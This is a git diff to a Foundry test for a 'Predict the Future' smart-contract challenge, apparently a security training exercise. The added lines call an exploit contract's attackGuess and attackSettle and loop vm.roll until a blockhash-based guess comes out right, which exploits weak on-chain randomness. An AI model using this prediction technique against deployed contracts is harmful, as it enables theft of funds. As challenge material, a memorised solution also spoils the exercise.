@@ -18,11 +18,18 @@ contract PredictTheFutureTest is Test {
     function testGuess() public {
         // Set block number and timestamp
         // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
-        vm.roll(104293);
+        uint256 startBlock = 104293;
+        vm.roll(startBlock);
         vm.warp(93582192);
 
         // Put your solution here
+        exploitContract.attackGuess{value: 1 ether}();
 
+        while (0 != (uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10)) {
+            startBlock += 2;
+            vm.roll(startBlock);
+        }
+        exploitContract.attackSettle();
         _checkSolved();
     }
 
